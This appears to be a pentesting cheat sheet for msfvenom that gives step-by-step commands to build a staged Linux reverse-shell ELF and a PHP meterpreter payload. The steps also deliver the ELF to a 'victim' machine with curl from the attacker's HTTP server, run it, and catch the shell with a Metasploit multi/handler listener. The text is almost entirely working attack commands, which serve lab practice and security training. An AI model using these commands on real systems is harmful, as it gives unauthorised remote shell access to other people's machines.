# msfvenom

### Example 1: Create a Reverse Shell in Linux with a Staged Payload
A staged payload sends a small stager to the target, which connects back to the attacker and downloads the rest of the payload. As an advantage it's smaller in size, but it requires the use of a special listener - the `exploit/multi/handler` in Metasploit, with payload set to the same payload that was used in msfvenom. 

I'm testing locally with localhost in this example, so modify the IP address accordingly. 

To search for payloads: 
```
└─$ msfvenom  --list payloads | grep x64 | grep linux | grep reverse
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```

Pick the staged shell payload `linux/x64/shell/reverse_tcp`:
```
$ msfvenom -p linux/x64/shell/reverse_tcp lhost=127.0.0.1 lport=5353 -f elf -o reverse5353
```
Pass this payload to the target machine
* A possible approach is to start up a python simple HTTP server in the directory with `python -m SimpleHTTPServer:8765` and then in the injection point of the victim machine, use curl to download the file: `curl http://ip:port/reverse5353 -o /tmp/reverse5353`

Next, make the payload executable
```
$ chmod +x reverse5353
$ ./reverse5353
```

On Kali, set up a listener **with the same payload**:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp 
msf6 exploit(multi/handler) > set lhost 127.0.0.1
msf6 exploit(multi/handler) > set lport 5353
msf6 exploit(multi/handler) > run
```

Finally, run the stager on victim's machine. 
```
$ ./reverse5353
```
It should starts downloading the rest of the payload from Kali, which starts a reverse shell on Kali. 

(optional) upgrade to a meterpreter with `/post/multi/manage/shell_to_meterpreter` module


### Example 2: Create a reverse shell with a PHP payload 
```
$ msfvenom -p php/meterpreter_reverse_tcp lhost=<my-ip> lport=<port> -o shell.php
```
set up a listener **with the same payload** using `exploit/multi/handler`
